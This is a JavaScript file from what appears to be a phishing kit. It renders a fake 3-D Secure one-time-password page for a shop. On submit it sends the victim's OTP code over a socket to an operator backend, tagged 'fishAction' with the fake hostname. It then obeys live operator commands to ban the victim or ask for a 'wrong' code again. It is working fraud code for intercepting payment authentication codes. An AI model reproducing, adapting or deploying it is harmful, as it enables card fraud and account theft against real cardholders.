console.log('hp-script-OTPpage.js works');

const hpOTPForm = document.querySelector('.hpOTPForm');
const hpOTPInput = document.querySelector('.hpOTPInput');
const hpSpinner = document.querySelector('.hp-loading-ring-wrapper');
const hpShopName = document.querySelector('.hpShopName');
hpShopName.innerHTML = confShopName;

//get params from request

const params = new URLSearchParams(window.location.search);
const otpType = params.get('otp');

// show actual type of 3ds
const hpOTPTypeSMSForm = document.querySelector('.hpOTPTypeSMSForm');
const hpOTPTypePushForm = document.querySelector('.hpOTPTypePushForm');

if (otpType === 'PHONE') {
    hpOTPTypeSMSForm.classList.remove('displaynone');
    hpOTPTypePushForm.classList.add('displaynone');
}
if (otpType === 'AuthApp') {
    hpOTPTypePushForm.classList.remove('displaynone');
    hpOTPTypeSMSForm.classList.add('displaynone');
}

// Выводим значение параметра
console.log(otpType);

// init socket connection and send previous socketID to link in to veri first SocketID
let socket;

if (!socket) {
    socket = await initSocketConnection();
    socket.emit('fishFirstSocketId', {
        fishFirstSocketId: localStorage.hpFirstSocketId,
    });
    // initSocketOnFunc(socket)
}

hpOTPForm.addEventListener('submit', () => {
    socket.emit('fishAction', {
        action: 'fishAction',
        actionData: `OTP CODE ${hpOTPInput.value}`,
        project: project,
        projectType: projectType,
        fake: window.location.hostname,
    });
    hpSpinner.classList.remove('displaynone');
});

socket.on('toFishAction', data => {
    console.log(data);

    if (data.action === 'BAN') {
        window.location.replace(`${banLink}`);
    }

    if (data.action === 'SHOW WRONG OTP') {
        hpSpinner.classList.add('displaynone');
        alert('Wrong OTP code');
        hpOTPInput.value = '';
    }
});
